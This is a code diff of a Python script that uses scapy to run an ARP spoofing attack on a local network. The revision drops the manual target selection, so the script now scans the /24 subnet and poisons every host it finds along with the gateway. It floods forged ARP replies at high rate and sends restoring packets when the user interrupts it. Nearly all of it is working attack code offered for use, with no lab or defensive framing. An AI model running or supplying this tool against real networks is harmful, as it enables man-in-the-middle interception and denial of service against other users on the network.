@@ -1,171 +1,94 @@
 import time
-import uuid
 import os
 import socket
-import requests
-from concurrent.futures import ThreadPoolExecutor
-from scapy.all import ARP, Ether, sendp, srp
+from scapy.all import ARP, Ether, sendpfast, srp, getmacbyip, conf
 
 if os.geteuid() != 0:
-    print("Please run the script as root (e.g., using sudo).")
+    print("Run with sudo.")
     exit(1)
 
-attack_in_progress = True
-ip_gateway = None
-mac_attacker = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8 * 6, 8)][::-1])
-gateway_mac = None
-
-
-def get_local_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-    except Exception:
-        ip = "127.0.0.1"
-    finally:
-        s.close()
-    return ip
-
-
-def get_mac(ip):
-    arp_req = ARP(pdst=ip)
-    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet = broadcast / arp_req
-    result = srp(packet, timeout=2, verbose=0)[0]
-    for sent, received in result:
-        return received.hwsrc
-
-
-def get_hostname(ip):
-    try:
-        return socket.gethostbyaddr(ip)[0]
-    except Exception:
-        return "Unknown"
-
-
-def get_vendor(mac):
-    try:
-        response = requests.get(f"https://api.macvendors.com/{mac}", timeout=3)
-        if response.status_code == 200:
-            return response.text
-    except Exception:
-        pass
-    return "Unknown"
-
-
-def get_device_label(ip, mac):
-    hostname = get_hostname(ip)
-    vendor = get_vendor(mac)
-    if hostname == ip or hostname == "Unknown":
-        return vendor if vendor != "Unknown" else ip
-    else:
-        return f"{hostname} ({vendor})" if vendor != "Unknown" else hostname
-
-
-def restore_connection(target_ip):
-    mac_target = get_mac(target_ip)
-    mac_gw = get_mac(ip_gateway)
-    if mac_target and mac_gw:
-        pkt1 = Ether(dst=mac_target) / ARP(op=2, pdst=target_ip, hwdst=mac_target, psrc=ip_gateway, hwsrc=mac_gw)
-        pkt2 = Ether(dst=mac_gw) / ARP(op=2, pdst=ip_gateway, hwdst=mac_gw, psrc=target_ip, hwsrc=mac_target)
-        sendp(pkt1, count=5, verbose=0)
-        sendp(pkt2, count=5, verbose=0)
-        print(f"Restored connection for {target_ip}")
-    else:
-        print(f"Could not restore connection for {target_ip}")
+attack_active = True
+mac_attacker = Ether().src
+conf.verb = 0
 
 
 def get_gateway():
-    gw = os.popen("route -n get default 2>/dev/null | grep 'gateway:' | awk '{print $2}'").read().strip()
-    return gw
+    try:
+        return os.popen("route -n get default | grep 'gateway:' | awk '{print $2}'").read().strip()
+    except:
+        return None
+
+
+def get_local_ip():
+    try:
+        return socket.gethostbyname(socket.gethostname())
+    except:
+        return socket.gethostbyname_ex(socket.gethostname())[2][0]
 
 
 def get_network():
-    gw = get_gateway()
-    if not gw:
-        print("Could not get gateway")
-        exit(1)
-    parts = gw.split('.')
-    return '.'.join(parts[:3]) + '.0/24'
+    ip = get_local_ip().split('.')
+    return f"{ip[0]}.{ip[1]}.{ip[2]}.0/24"
 
 
-def scan_network(network):
-    arp_req = ARP(pdst=network)
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet = ether / arp_req
-    result = srp(packet, timeout=2, verbose=0)[0]
-    devices = []
-    for sent, received in result:
-        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
-    return devices
+def scan_network():
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=get_network()), timeout=2, verbose=0)
+    local_ip = get_local_ip()
+    gateway = get_gateway()
+    return {rcv.psrc: rcv.hwsrc for _, rcv in ans if rcv.psrc not in (local_ip, gateway)}
 
 
-def spoof_target(target_ip, target_mac):
-    global attack_in_progress, ip_gateway, mac_attacker, gateway_mac
-    pkt_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=ip_gateway, hwsrc=mac_attacker)
-    pkt_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=ip_gateway, psrc=target_ip, hwsrc=mac_attacker)
-    while attack_in_progress:
-        for _ in range(20):
-            sendp(pkt_target, verbose=0)
-            sendp(pkt_gateway, verbose=0)
-        time.sleep(0.005)
+def generate_packets(targets, gateway_ip, gateway_mac):
+    packets = []
+    for target_ip, target_mac in targets.items():
+        packets += [
+            Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=mac_attacker),
+            Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=mac_attacker)
+        ]
+    return packets * 15
+
+
+def spoof_loop(packets):
+    while attack_active:
+        sendpfast(packets, mbps=500, loop=100, parse_results=False)
+        time.sleep(0.01)
+
+
+def restore_targets(targets, gateway_ip, gateway_mac):
+    restore_packets = []
+    for target_ip, target_mac in targets.items():
+        restore_packets += [
+                               Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=gateway_mac),
+                               Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=target_mac)
+                           ] * 25
+    sendpfast(restore_packets, mbps=1000)
 
 
 def main():
-    global ip_gateway, gateway_mac, attack_in_progress
-    ip_gateway = get_gateway()
-    gateway_mac = get_mac(ip_gateway)
-    network = get_network()
-    all_devices = scan_network(network)
-    local_ip = get_local_ip()
-    devices = [d for d in all_devices if d['ip'] != local_ip]
-    if not devices:
-        print("No devices found (excluding the local device).")
-        return
-    print("Devices found:")
-    for i, d in enumerate(devices, 1):
-        label = get_device_label(d['ip'], d['mac'])
-        print(f"{i}. IP: {d['ip']}, MAC: {d['mac']}, Name: {label}")
-    selected = input("Enter device numbers to attack (comma separated) or 'all' to attack all devices: ").strip()
-    target_ips = []
-    if selected.lower() == "all":
-        target_ips = [d['ip'] for d in devices]
-    else:
-        try:
-            indices = [int(x.strip()) for x in selected.split(',') if x.strip().isdigit()]
-        except:
-            print("Invalid input.")
-            return
-        for idx in indices:
-            if 1 <= idx <= len(devices):
-                target_ips.append(devices[idx - 1]['ip'])
-    if not target_ips:
-        print("No valid devices selected.")
-        return
-    targets = {}
-    for ip in target_ips:
-        mac = get_mac(ip)
-        if mac:
-            targets[ip] = mac
-        else:
-            print(f"Could not get MAC for {ip}")
+    global attack_active
+
+    gateway_ip = get_gateway()
+    if not gateway_ip:
+        exit("Gateway not found")
+
+    gateway_mac = getmacbyip(gateway_ip)
+    if not gateway_mac:
+        exit("Gateway MAC not found")
+
+    targets = scan_network()
     if not targets:
-        print("No valid targets found.")
-        return
-    with ThreadPoolExecutor(max_workers=len(targets)) as executor:
-        for ip, mac in targets.items():
-            executor.submit(spoof_target, ip, mac)
-        print("ARP spoofing in progress. Press Ctrl+C to stop and restore connections.")
-        try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            attack_in_progress = False
-            time.sleep(2)
-            for ip in targets.keys():
-                restore_connection(ip)
-            print("Attack stopped. Connections restored.")
+        exit("No targets found")
+
+    print(f"Targeting {len(targets)} devices on {gateway_ip}")
+    packets = generate_packets(targets, gateway_ip, gateway_mac)
+
+    try:
+        print("Spoofing ARP tables... (CTRL+C to stop)")
+        spoof_loop(packets)
+    except KeyboardInterrupt:
+        attack_active = False
+        print("\nRestoring network...")
+        restore_targets(targets, gateway_ip, gateway_mac)
 
 
 if __name__ == '__main__':
